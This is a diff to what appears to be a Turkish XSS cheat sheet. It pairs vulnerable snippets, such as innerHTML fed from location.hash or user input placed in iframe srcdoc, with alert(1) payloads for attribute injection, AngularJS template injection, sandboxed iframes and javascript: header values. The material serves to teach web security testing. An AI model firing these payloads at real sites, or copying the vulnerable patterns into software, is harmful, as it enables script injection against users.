@@ -37,11 +37,11 @@ javascript:alert(1)"
 <br>
 🎯 Exploit:  
 ```html
-<base href="javascript://">
-<a href="/x">Click</a>
-```
-Bu durumda /x → javascript://x olur.
-<br>
+" onclick=alert(1) x="
+```  
+```js
+alert(1)
+``` 
 <br>
 
 
@@ -54,7 +54,8 @@ Bu durumda /x → javascript://x olur.
   Hello {{user}}
 </script>
 ```
-<br><br>
+<br>
+
 🎯 Exploit:  
 ```js
 {{constructor.constructor("alert(1)")()}}
@@ -81,11 +82,13 @@ Bu durumda /x → javascript://x olur.
 <h4>HTML içeriği iframe içine srcdoc olarak yazılır.</h4><br>
 
 📌 Örnek:  
-`document.body.innerHTML = location.hash;`  
-<br>
+```document.body.innerHTML = `<iframe srcdoc="${userInput}">`;```  
+veya  
+`element.innerHTML = location.hash;`
+<br>  
 🎯 Exploit:  
 ```html
-#<img src=x onerror=alert(1)>
+#<iframe srcdoc="<script>alert(1)</script>" sandbox="allow-scripts">
 ```
 <br>
 
@@ -95,7 +98,7 @@ Bu durumda /x → javascript://x olur.
 <h4>iframe[sandbox], CSP gibi güvenlik kontrollerinin yanlış yapılandırılması sonucu ortaya çıkar.</h4><br>
 
 📌 Örnek:  
-`asd`  
+`<iframe sandbox="allow-scripts" srcdoc="PAYLOAD"></iframe>`  
 <br>
 🎯 Exploit:  
 ```html
@@ -109,11 +112,11 @@ Bu durumda /x → javascript://x olur.
 <h4>Bazı XSS'ler response header içeriğiyle tetiklenir.</h4><br>
 
 📌 Örnek:  
-`Location: javascript:alert(1)`
-<br>
+`Location: "PAYLOAD"`
+<br>  
 🎯 Exploit:  
 ```html
-asd
+javascript:alert(1)
 ```
-Ayrıca:  
-`Refresh:` `Referer:` `Content-Security-Policy:` injection da olabilir.
+Ayrıca kontrol edilmesi gerekenler:  
+`Refresh:` `Referer:` `Content-Security-Policy:` injection olabilir.
